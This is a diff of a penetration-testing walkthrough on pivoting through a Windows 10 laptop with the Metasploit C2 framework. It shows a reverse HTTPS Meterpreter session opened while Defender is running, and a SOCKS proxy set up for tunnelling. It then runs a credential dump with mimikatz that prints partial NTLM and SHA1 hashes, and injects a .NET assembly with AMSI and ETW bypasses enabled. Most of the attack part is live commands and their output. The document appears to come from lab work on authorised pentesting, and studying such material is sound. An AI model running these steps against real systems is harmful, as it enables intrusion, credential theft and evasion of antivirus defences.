@@ -1,5 +1,5 @@
 ===========================================================================================================================================
-Pivoting with Metasploit
+Pivoting with the Metasploit penetration testing and C2 framework
 ===========================================================================================================================================
 
 During during penetration tests, Command and Control solutions (C2) like the Metasploit framework can be used to create a reverse tunnel between
@@ -145,10 +145,8 @@ HandlerSSLCert => /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem
 
 
 ===========================================================================================================================================
-PoC - Step 2 - Run the Meterpreter payload (reverse HTTPS) on the Windows 10 laptop (with Defender AV enabled and up-to-date)
+PoC - Step 2 - Run the Meterpreter payload (reverse HTTPS) on a target Windows 10 laptop (with Defender AV enabled and up-to-date)
 ===========================================================================================================================================
-
-Note: By generating an encrypted meterpreter payload and using an AMSI bypass, our payload is not detected nor blocked by the Microsoft Defender AV running on the Windows target.
 
 Microsoft Windows [Version 10.0.19044.2130]
 (c) Microsoft Corporation. All rights reserved.
@@ -173,10 +171,8 @@ PoC - Step 3 - Configure the meterpreter handler (C2 server) to pivot into the i
 [*] Started HTTPS reverse handler on https://192.168.56.104:443
 
 msf6 exploit(multi/handler) > 
-[!] https://192.168.56.104:443 handling request from 192.168.56.1; (UUID: qghkh4ur) Without a database connected that payload UUID tracking will not work!
 [*] https://192.168.56.104:443 handling request from 192.168.56.1; (UUID: qghkh4ur) Encoded stage with x86/shikata_ga_nai
 [*] https://192.168.56.104:443 handling request from 192.168.56.1; (UUID: qghkh4ur) Staging x86 payload (176249 bytes) ...
-[!] https://192.168.56.104:443 handling request from 192.168.56.1; (UUID: qghkh4ur) Without a database connected that payload UUID tracking will not work!
 [*] Meterpreter session 1 opened (192.168.56.104:443 -> 127.0.0.1 ) at 2022-11-01 18:34:12 +0100
 
 msf6 exploit(multi/handler) > sessions -i
@@ -186,7 +182,7 @@ Active sessions
 
   Id  Name  Type                     Information                        Connection
   --  ----  ----                     -----------                        ----------
-  1         meterpreter x86/windows  PO718687\Administrator @ PO718687  192.168.56.104:443 -> 127.0.0.1  (192.168.1.113)
+  1         meterpreter x86/windows  Laptop1\Administrator @ Laptop1  192.168.56.104:443 -> 127.0.0.1  (192.168.1.113)
   
   
 msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy
@@ -235,64 +231,7 @@ Notes
 # echo "socks5 127.0.0.1 1080" > /etc/proxychains.conf
 ------------------------------------------------------------------
 
-msf6 auxiliary(server/socks_proxy) > cat /etc/proxychains.conf
-[*] exec: cat /etc/proxychains.conf
-
-# proxychains.conf  VER 3.1
-#
-#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
-#
-
-# The option below identifies how the ProxyList is treated.
-# only one option should be uncommented at time,
-# otherwise the last appearing option will be accepted
-#
-#dynamic_chain
-#
-# Dynamic - Each connection will be done via chained proxies
-# all proxies chained in the order as they appear in the list
-# at least one proxy must be online to play in chain
-# (dead proxies are skipped)
-# otherwise EINTR is returned to the app
-#
-strict_chain
-#
-# Strict - Each connection will be done via chained proxies
-# all proxies chained in the order as they appear in the list
-# all proxies must be online to play in chain
-# otherwise EINTR is returned to the app
-#
-#random_chain
-#
-# Random - Each connection will be done via random proxy
-# (or proxy chain, see  chain_len) from the list.
-# this option is good to test your IDS :)
-                                                                                                                                                                            
-# Make sense only if random_chain                                                                                                                                           
-#chain_len = 2                                                                                                                                                              
-                                                                                                                                                                            
-# Quiet mode (no output from library)                                                                                                                                       
-#quiet_mode                                                                                                                                                                 
-                                                                                                                                                                            
-# Proxy DNS requests - no leak for DNS data                                                                                                                                 
-proxy_dns                                                                                                                                                                   
-                                                                                                                                                                            
-# Some timeouts in milliseconds                                                                                                                                             
-tcp_read_time_out 15000                                                                                                                                                     
-tcp_connect_time_out 8000                                                                                                                                                   
-                                                                                                                                                                            
-# ProxyList format                                                                                                                                                          
-#       type  host  port [user pass]                                                                                                                                        
-#       (values separated by 'tab' or 'blank')                                                                                                                              
-#                                                                                                                                                                           
-#                                                                                                                                                                           
-#        Examples:
-#
-#               socks5  192.168.67.78   1080    lamer   secret
-#               http    192.168.89.3    8080    justu   hidden
-#               socks4  192.168.1.49    1080
-#               http    192.168.39.93   8080
-#
+jeff@kali:~$ tail /etc/proxychains.conf 
 #
 #       proxy types: http, socks4, socks5
 #        ( auth types supported: "basic"-http  "user/pass"-socks )
@@ -407,3 +346,385 @@ index.html                                     [ <=>                            
 
 2022-11-01 19:24:06 (92.4 KB/s) - ‘index.html’ saved [3357]
 
+
+============================================================================================================================================
+Other - Post-exploitation modules & AV detection  
+============================================================================================================================================
+
+There are many post-exploitation modules available with the Metasploit C2 framework. 
+However, most of them are nowadays easily detected by Antivirus solutions and should not be used unless you don't care about being detected by 
+the SOC / Blue team of the company hiring you (Penetration test assignment Versus Red Team assignement).
+
+For instance, the post-exploitation modules like "hashdump", "getsystem" and "shell" are detected by the Windows Defender AV as:
+> 'Behavior:Win32/Meterpreter.gen!D'
+> 'Behavior:Win32/Meterpreter.D'
+> 'Behavior:Win32/Meterpreter.A!sms'
+> 'Behavior:Win32/Meterpreter.C!sms'
+> ...
+
+
+Below are some examples of post-exploitation commands and modules
+----------------------------------------------------------------
+
+meterpreter > help
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    detach                    Detach the meterpreter session (for http/https)
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    pivot                     Manage pivot listeners
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session
+    ssl_verify                Modify the SSL certificate verification setting
+    transport                 Manage the transport mechanisms
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    cp            Copy source to destination
+    del           Delete the specified file
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    show_mount    List all mount points/logical drives
+    upload        Upload a file or directory
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    arp           Display the host ARP cache
+    getproxy      Display the current proxy configuration
+    ifconfig      Display interfaces
+    ipconfig      Display interfaces
+    netstat       Display the network connections
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+    route         View and modify the routing table
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    clearev       Clear the event log
+    drop_token    Relinquishes any active impersonation token.
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getprivs      Attempt to enable all privileges available to the current process
+    getsid        Get the SID of the user that the server is running as
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    reboot        Reboots the remote computer
+    reg           Modify and interact with the remote registry
+    rev2self      Calls RevertToSelf() on the remote machine
+    shell         Drop into a system command shell
+    shutdown      Shuts down the remote computer
+    steal_token   Attempts to steal an impersonation token from the target process
+    suspend       Suspends or resumes a list of processes
+    sysinfo       Gets information about the remote system, such as OS
+
+Stdapi: User interface Commands
+===============================
+
+    Command        Description
+    -------        -----------
+    enumdesktops   List all accessible desktops and window stations
+    getdesktop     Get the current meterpreter desktop
+    idletime       Returns the number of seconds the remote user has been idle
+    keyboard_send  Send keystrokes
+    keyevent       Send key events
+    keyscan_dump   Dump the keystroke buffer
+    keyscan_start  Start capturing keystrokes
+    keyscan_stop   Stop capturing keystrokes
+    mouse          Send mouse events
+    screenshare    Watch the remote user desktop in real time
+    screenshot     Grab a screenshot of the interactive desktop
+    setdesktop     Change the meterpreters current desktop
+    uictl          Control some of the user interface components
+
+Stdapi: Webcam Commands
+=======================
+
+    Command        Description
+    -------        -----------
+    record_mic     Record audio from the default microphone for X seconds
+    webcam_chat    Start a video chat
+    webcam_list    List webcams
+    webcam_snap    Take a snapshot from the specified webcam
+    webcam_stream  Play a video stream from the specified webcam
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play a waveform audio file (.wav) on the target system
+
+Priv: Elevate Commands
+======================
+
+    Command       Description
+    -------       -----------
+    getsystem     Attempt to elevate your privilege to that of local system.
+
+Priv: Password database Commands
+================================
+
+    Command       Description
+    -------       -----------
+    hashdump      Dumps the contents of the SAM database
+
+Priv: Timestomp Commands
+========================
+
+    Command       Description
+    -------       -----------
+    timestomp     Manipulate file MACE attributes
+
+Kiwi Commands
+=============
+
+    Command                Description
+    -------                -----------
+    creds_all              Retrieve all credentials (parsed)
+    creds_kerberos         Retrieve Kerberos creds (parsed)
+    creds_livessp          Retrieve Live SSP creds
+    creds_msv              Retrieve LM/NTLM creds (parsed)
+    creds_ssp              Retrieve SSP creds
+    creds_tspkg            Retrieve TsPkg creds (parsed)
+    creds_wdigest          Retrieve WDigest creds (parsed)
+    dcsync                 Retrieve user account information via DCSync (unparsed)
+    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
+    golden_ticket_create   Create a golden kerberos ticket
+    kerberos_ticket_list   List all kerberos tickets (unparsed)
+    kerberos_ticket_purge  Purge any in-use kerberos tickets
+    kerberos_ticket_use    Use a kerberos ticket
+    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
+    lsa_dump_sam           Dump LSA SAM (unparsed)
+    lsa_dump_secrets       Dump LSA secrets (unparsed)
+    password_change        Change the password/hash of a user
+    wifi_list              List wifi profiles/creds for the current user
+    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
+
+------------------------
+
+meterpreter > getuid
+Server username: Laptop1\Administrator
+
+
+meterpreter > getpid
+Current pid: 2564
+
+
+meterpreter > pwd
+C:\Users\Administrator\Documents\Tools-AD            
+
+
+meterpreter > getprivs
+
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeBackupPrivilege
+SeChangeNotifyPrivilege
+SeCreateGlobalPrivilege
+SeCreatePagefilePrivilege
+SeCreateSymbolicLinkPrivilege
+SeDebugPrivilege
+SeImpersonatePrivilege
+SeIncreaseBasePriorityPrivilege
+SeIncreaseQuotaPrivilege
+SeIncreaseWorkingSetPrivilege
+SeLoadDriverPrivilege
+SeManageVolumePrivilege
+SeProfileSingleProcessPrivilege
+SeRemoteShutdownPrivilege
+SeRestorePrivilege
+SeSecurityPrivilege
+SeShutdownPrivilege
+SeSystemEnvironmentPrivilege
+SeSystemProfilePrivilege
+SeSystemtimePrivilege
+SeTakeOwnershipPrivilege
+SeTimeZonePrivilege
+SeUndockPrivilege
+
+
+meterpreter > powershell_execute "ipconfig"
+[+] Command execution completed:
+
+Windows IP Configuration
+
+<SNIP>
+Wireless LAN adapter WiFi:
+
+   Connection-specific DNS Suffix  . :
+   IPv4 Address. . . . . . . . . . . : 192.168.1.113
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.1.254
+
+
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name                      Arch  Session  User                                             Path
+ ---   ----  ----                      ----  -------  ----                                             ----
+ 0     0     [System Process]
+ 4     0     System                    x64   0
+ 68    2100  cmd.exe                   x64   1        ORACLESERVER1\Administrator                      C:\Windows\System32\cmd.exe
+ 76    540   svchost.exe               x64   1        ORACLESERVER1\Administrator                      C:\Windows\System32\svchost.exe
+ 140   476   dwm.exe                   x64   1        Window Manager\DWM-1                             C:\Windows\System32\dwm.exe
+ 172   2100  MSASCui.exe               x64   1        ORACLESERVER1\Administrator                      C:\Program Files\Windows Defender\MSASCui.exe
+ 256   4     smss.exe                  x64   0
+ 304   636   ShellExperienceHost.exe   x64   1        ORACLESERVER1\Administrator                      C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2t
+ <SNIP>
+
+
+meterpreter > load powershell
+Loading extension powershell...Success.
+
+
+meterpreter > powershell_execute "hostname"
+[+] Command execution completed:
+Laptop1
+
+
+meterpreter > load kiwi
+
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+Success.
+
+meterpreter > kiwi_cmd "privilege::debug" "sekurlsa::logonpasswords"
+Privilege '20' OK
+
+mimikatz(powershell) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 168639 (00000000:000292bf)
+Session           : Interactive from 1
+User Name         : Administrator
+Domain            : Laptop1
+Logon Server      : Laptop1
+Logon Time        : 12/30/2022 8:04:52 PM
+SID               : S-1-5-21-1644803877-2661921197-3301414406-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : Laptop1
+         * NTLM     : cf3a5525ee9414229e66279<SNIP>
+         * SHA1     : 3c7374127c9a60f9e5b28d3<SNIP>
+        tspkg :
+        wdigest :
+         * Username : Administrator
+         * Domain   : Laptop1
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : Laptop1
+         * Password : (null)
+        ssp :
+        credman :
+<SNIP>
+
+
+msf6 post(windows/manage/execute_dotnet_assembly) > options
+
+Module options (post/windows/manage/execute_dotnet_assembly):
+
+   Name            Current Setting                              Required  Description
+   ----            ---------------                              --------  -----------
+   AMSIBYPASS      true                                         yes       Enable Amsi bypass
+   ARGUMENTS                                                    no        Command line arguments
+   DOTNET_EXE      /home/jeff/Documents/Tools/Windows/SharpDum  yes       Assembly file name
+                   p.exe
+   ETWBYPASS       true                                         yes       Enable Etw bypass
+   PID             0                                            no        Pid  to inject
+   PPID            0                                            no        Process Identifier for PPID spoofing when creating a new process. (0 = no PPID
+                                                                          spoofing)
+   PROCESS         notepad.exe                                  no        Process to spawn
+   SESSION         2                                            yes       The session to run this module on
+   Signature       Automatic                                    yes       The Main function signature (Accepted: Automatic, Main(), Main(string[]))
+   USETHREADTOKEN  true                                         no        Spawn process with thread impersonation
+   WAIT            10                                           no        Time in seconds to wait
+
+msf6 post(windows/manage/execute_dotnet_assembly) > run
+
+[!] SESSION may not be compatible with this module:
+[!]  * missing Meterpreter features: stdapi_sys_process_set_term_size
+[*] Running module against Laptop1
+[*] Launching notepad.exe to host CLR...
+[+] Process 4296 launched.
+[*] Reflectively injecting the Host DLL into 4296..
+[*] Injecting Host into 4296...
+[*] Host injected. Copy assembly into 4296...
+[*] Assembly copied.
+[*] Executing...
+[*] Start reading output
+[*] End output.
+[+] Execution finished.
+[*] Post module execution completed
